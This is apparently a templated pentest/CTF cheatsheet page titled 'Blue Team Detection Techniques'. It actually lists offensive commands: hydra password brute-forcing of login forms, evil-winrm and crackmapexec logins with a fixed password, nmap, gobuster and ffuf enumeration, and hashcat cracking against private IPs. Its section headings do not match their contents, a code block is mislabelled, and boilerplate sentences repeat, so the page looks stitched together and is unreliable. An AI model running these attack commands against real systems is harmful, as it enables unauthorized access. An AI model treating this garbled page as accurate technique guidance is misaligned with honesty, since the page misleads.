---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "windows, privilege escalation, persistence, oscp, cheatsheet"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-979.html"
URL_IMAGES: ""
Date: "2025-10-27"
Tags: "Windows, Privilege Escalation, Persistence, OSCP, Cheatsheet"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-979"
Permalink: "/notes/note-blue-team-detection-techniques-979.html"
BtnLabel: "Read Notes"
Pick: 0
---
## NTLM Relay

### Resource-Based Constrained Delegation

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.91.153.26 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.30.229.193 -u administrator -p 'P@ssw0rd!'
```

- `Kerberoasting`
- `rubeus`
- `metasploit`
- `Unconstrained Delegation`
- `hydra`

```python
nmap -sCV -p445,25,139 10.63.136.108 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.121.202.4/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

## Broken Access Control

### Flask

> **Note:** Weak Service Permissions was identified as the primary attack vector in this scenario.

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
crackmapexec smb 10.65.19.238 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.61.238.182 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.66.66.83 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.100.125 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.6.163 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p1433,995,5432 10.24.113.104 -oN scan.txt
gobuster dir -u http://10.112.141.91/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.103.66.116 -u administrator -p 'P@ssw0rd!'
```

## AS-REP Roasting

### SMTP

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

- `Sudo Misconfiguration`
- `ligolo-ng`
- `atexec`
